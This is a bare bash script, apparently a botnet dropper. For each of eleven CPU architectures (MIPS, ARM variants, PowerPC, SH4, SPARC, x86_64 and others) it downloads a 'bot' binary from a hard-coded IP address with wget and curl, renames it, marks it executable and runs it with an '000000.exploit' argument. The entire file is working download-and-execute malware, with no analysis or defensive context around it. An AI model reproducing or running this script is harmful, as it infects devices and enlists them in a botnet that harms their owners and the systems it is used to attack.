#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.mips; curl -O http://109.206.241.211/bins/bot.mips; cat bot.mips > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.mpsl; curl -O http://109.206.241.211/bins/bot.mpsl; cat bot.mpsl > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.arm; curl -O http://109.206.241.211/bins/bot.arm; cat bot.arm > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.arm5; curl -O http://109.206.241.211/bins/bot.arm5; cat bot.arm5 > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.arm6; curl -O http://109.206.241.211/bins/bot.arm6; cat bot.arm6 > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.arm7; curl -O http://109.206.241.211/bins/bot.arm7; cat bot.arm7 > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.ppc; curl -O http://109.206.241.211/bins/bot.ppc; cat bot.ppc > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.m68k; curl -O http://109.206.241.211/bins/bot.m68k; cat bot bot.m68k > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.sh4; curl -O http://109.206.241.211/bins/bot.sh4; cat bot.sh4 > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.spc; curl -O http://109.206.241.211/bins/bot.spc; cat bot.spc > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.206.241.211/bins/bot.x86_64; curl -O http://109.206.241.211/bins/bot.x86_64; cat bot.x86_64 > fuwwyowo; chmod +x *; ./fuwwyowo 000000.exploit
